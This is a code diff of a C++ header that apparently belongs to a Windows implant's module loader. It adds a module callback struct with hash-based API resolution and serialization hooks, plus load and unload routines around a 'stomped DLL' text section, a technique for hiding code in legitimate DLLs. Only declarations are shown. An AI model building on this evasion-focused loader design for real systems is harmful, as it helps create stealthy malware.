@@ -12,11 +12,33 @@
 #define PAGE_ALIGN(x) (((SIZE_T)(x) + 0xFFF) & ~(SIZE_T)0xFFF)
 
 #define MAX_MODULES 64
+#define MODULE_SLOT_SIZE ( ( SIZE_T ) 8 * 1024 )
 
+
+
+
+// struct passed to modules
+typedef struct {
+	INT32( WINAPI* ModuleUnpack4 )( );
+	PBYTE( WINAPI* ModuleUnpackBytes )( INT32 Length );
+
+	void ( WINAPI* ModulePack4 )( INT32 Value );
+	void ( WINAPI* ModulePack8 )( INT64 Value );
+	void ( WINAPI* ModulePackBytes )( PBYTE Data, INT32 length );
+
+	FARPROC ( WINAPI* ModuleGetProcAddress )( HMODULE dll, DWORD Hash );
+	HMODULE ( WINAPI* ModuleGetModule )( DWORD Hash );
+
+	HLOCAL ( WINAPI* ModuleAllocate )( SIZE_T size );
+	HLOCAL ( WINAPI* ModuleFreeMem ) ( HLOCAL buf  );
+}Module, *PModule;
+
+typedef void (WINAPI *ModuleEntry)(PModule, INT32);
 
 typedef struct {
 	INT32 id;
 	PVOID EntryPoint;
+	SIZE_T ModuleSize;
 	SIZE_T ModuleSizeInMemory;
 } ModuleInformation;
 
@@ -28,14 +50,18 @@ private:
 	ModuleInformation ModuleInfos[ MAX_MODULES ]{};
 
 
+	PModule ModuleStruct;
+
 	PVOID StompedDllText;
 	SIZE_T StompedDllTextSize;
 	PVOID TextSectionIndex;
 
 	PVOID ReserveArena( SIZE_T size );
 	void UpdateBitField( INT32 Bit );
+	void ClearBitField( INT32 Bit );
 	ModuleInformation* FindFreeModInfo( );
 	ModuleInformation* FindModInfoEntry( INT32 needed );
+	BOOL CraftModuleStruct( );
 
 	
 	
@@ -50,6 +76,7 @@ public:
 
 	BOOL IsModuleLoaded( INT32 bit );
 	BOOL LoadModule( PBYTE Module, SIZE_T ModuleSize, INT32 ModuleBit );
+	BOOL UnLoadModule( INT32 ModuleBit );
 	BOOL LoadStompedDll( );
 	BOOL GetStompedDllText( PVOID DllBase );
 	BOOL RunModuleCommand( INT32 ModuleBit );
